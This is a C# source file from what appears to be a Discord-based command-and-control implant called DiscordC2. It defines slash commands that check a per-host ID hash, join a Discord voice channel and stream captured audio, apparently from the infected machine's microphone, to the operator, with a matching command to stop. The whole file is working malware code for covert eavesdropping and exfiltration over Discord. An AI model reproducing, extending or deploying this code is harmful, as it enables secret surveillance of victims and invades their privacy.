using Discord;
using Discord.Audio;
using Discord.Interactions;
using DiscordC2.Common;

public class DiscordC2VC : InteractionModuleBase<ShardedInteractionContext>
{
    public InteractionService? Commands { get; set; }
    private AudioOutStream? discordStream;

    [SlashCommand("join", "join a voice channel")] 
    public async Task JoinChannel(string id, IVoiceChannel? channel = null)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;
        await DeferAsync();

        // check if already connected
        if (Context.Guild.CurrentUser.VoiceChannel != null) { await FollowupAsync("already connected"); return; }

        // Connect to channel
        channel ??= (Context.User as IGuildUser)?.VoiceChannel;
        if (channel == null) { await FollowupAsync("User must be in a voice channel, or a voice channel must be passed as an argument."); return; }
        var audioClient = await channel.ConnectAsync();
        await FollowupAsync("connected");

        // Transmit Audio
        discordStream = audioClient.CreatePCMStream(AudioApplication.Voice);
        try 
        {
            Voice.GetAudioStream(discordStream);
        } 
        finally 
        {
            await discordStream.FlushAsync();
        }
        
    }

    [SlashCommand("leave", "leave a voice channel")] 
    public async Task LeaveChannel()
    {
        await DeferAsync();
        if (Context.Guild.CurrentUser.VoiceChannel == null) { await FollowupAsync("not in a voice channel"); return; }
        Voice.StopAudioStream();
        if (discordStream != null)
            await discordStream.DisposeAsync();
        await Context.Guild.CurrentUser.VoiceChannel.DisconnectAsync();
        await FollowupAsync("disconnected");
    }

}